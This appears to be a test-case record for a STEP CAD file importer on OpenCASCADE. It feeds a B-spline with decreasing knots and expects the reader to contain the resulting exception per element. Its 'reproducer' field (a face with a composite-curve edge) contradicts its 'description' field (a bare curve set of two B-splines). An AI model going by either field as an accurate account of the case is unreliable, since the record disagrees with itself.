reproducer: `ADVANCED_FACE` on a `PLANE`; sole boundary is a self-loop `EDGE_CURVE` whose 3D geometry is a `SURFACE_CURVE` wrapping a `COMPOSITE_CURVE` of two `COMPOSITE_CURVE_SEGMENT`s (one good `LINE`, one non-monotonic-knot `B_SPLINE_CURVE_WITH_KNOTS`) — mirrors Gp188's proven-working structural pattern (segments reference base curves directly, not `TRIMMED_CURVE`-wrapped; the `COMPOSITE_CURVE` itself wrapped in `SURFACE_CURVE`+`PCURVE`, not used bare as `EDGE_CURVE.edge_geometry`).

Distinct call site from Ad043 (`STEPControl_ActorRead::TransferShape`, per-ROOT try/catch) and Xp008 (`StepToTopoDS_TranslateEdgeLoop`, per-EDGE try/catch) — this one is nested one level deeper, inside a single edge's own composite-curve geometry, at per-segment granularity.

description: A bare curve set — the shape representation's own item, and therefore a real translation root — holds two `B_SPLINE_CURVE_WITH_KNOTS` elements that are structurally identical and differ only in their knot vector. `good_bspline_element` has monotonically increasing knots `(0.0, 1.0)`. `throwing_bspline_element` has DECREASING knots `(1.0, 0.5)`: schema-legal Part-21 bytes, but numerically invalid geometry — a B-spline constructor requires a non-decreasing knot sequence and raises a construction error on violation rather than returning an error code. The receiver must contain that exception at the individual element, log the loss, and carry on with the set's other elements.
expected_kernel_behavior: catch the construction exception at the individual set element, log that element as not mapped, and still emit the surviving element's edge into the output compound — rather than aborting the set, the representation, or the whole read.
notes: **See also**: Ad043, Xp008, Ad137 (the three coarser/sibling catch boundaries of this same class), M051, Xp017 (bare-curve-set siblings with non-geometric and empty item lists). Live-verified (2026-07-31, this worktree, OCP/OCCT 7.8.1): the transfer check list carries exactly ONE message, the warning " Entity not mapped to TopoDS", and the transferred shape is a compound holding exactly ONE edge — the good element's. Independently confirmed that the decreasing knot vector does raise (constructing the same degree-1 B-spline directly from the same poles/knots/multiplicities fails with "BSpline curve: Knots interval values too close"). Perturbation control: flipping the bad element's knots to `(0.0,1.0)` — a one-token byte change, nothing else — makes the warning disappear and the edge count go 1 → 2, so the observable is caused by the knot bytes and not by the surrounding scaffold.
